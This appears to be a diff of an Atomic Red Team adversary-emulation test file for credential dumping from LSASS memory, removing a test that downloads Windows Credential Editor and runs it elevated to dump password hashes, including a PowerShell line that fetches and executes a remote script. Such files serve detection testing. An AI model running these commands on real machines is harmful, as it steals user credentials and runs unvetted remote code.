@@ -1,56 +1,6 @@
 attack_technique: T1003.001
 display_name: "OS Credential Dumping: LSASS Memory"
 atomic_tests:
-- name: Windows Credential Editor
-  auto_generated_guid: 0f7c5301-6859-45ba-8b4d-1fac30fc31ed
-  description: |
-    Dump user credentials using Windows Credential Editor (supports Windows XP, 2003, Vista, 7, 2008 and Windows 8 only)
-
-    Upon successful execution, you should see a file with user passwords/hashes at %temp%/wce-output.file.
-
-    If you see no output it is likely that execution was blocked by Anti-Virus. 
-
-    If you see a message saying \"wce.exe is not recognized as an internal or external command\", try using the  get-prereq_commands to download and install Windows Credential Editor first.
-  supported_platforms:
-  - windows
-  input_arguments:
-    output_file:
-      description: Path where resulting data should be placed
-      type: Path
-      default: '%temp%\wce-output.txt'
-    wce_zip_hash:
-      description: File hash of the Windows Credential Editor zip file
-      type: String
-      default: 8F4EFA0DDE5320694DD1AA15542FE44FDE4899ED7B3A272063902E773B6C4933
-    wce_exe:
-      description: Path of Windows Credential Editor executable
-      type: Path
-      default: PathToAtomicsFolder\T1003.001\bin\wce.exe
-    wce_url:
-      description: Path to download Windows Credential Editor zip file
-      type: Url
-      default: https://www.ampliasecurity.com/research/wce_v1_41beta_universal.zip
-  dependency_executor_name: powershell
-  dependencies:
-  - description: |
-      Windows Credential Editor must exist on disk at specified location (#{wce_exe})
-    prereq_command: |
-      if (Test-Path #{wce_exe}) {exit 0} else {exit 1}
-    get_prereq_command: |
-      $parentpath = Split-Path "#{wce_exe}"; $zippath = "$parentpath\wce.zip"
-      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-      IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1" -UseBasicParsing)
-      if(Invoke-WebRequestVerifyHash "#{wce_url}" "$zippath" #{wce_zip_hash}){
-        Expand-Archive $zippath $parentpath\wce -Force
-        Move-Item $parentpath\wce\wce.exe "#{wce_exe}"
-        Remove-Item $zippath, $parentpath\wce -Recurse
-      }
-  executor:
-    command: |
-      #{wce_exe} -o #{output_file}
-    cleanup_command: del "#{output_file}" >nul 2>&1
-    name: command_prompt
-    elevation_required: true
 - name: Dump LSASS.exe Memory using ProcDump
   auto_generated_guid: 0be2230c-9ab3-4ac2-8826-3199b9a0ebf8
   description: |
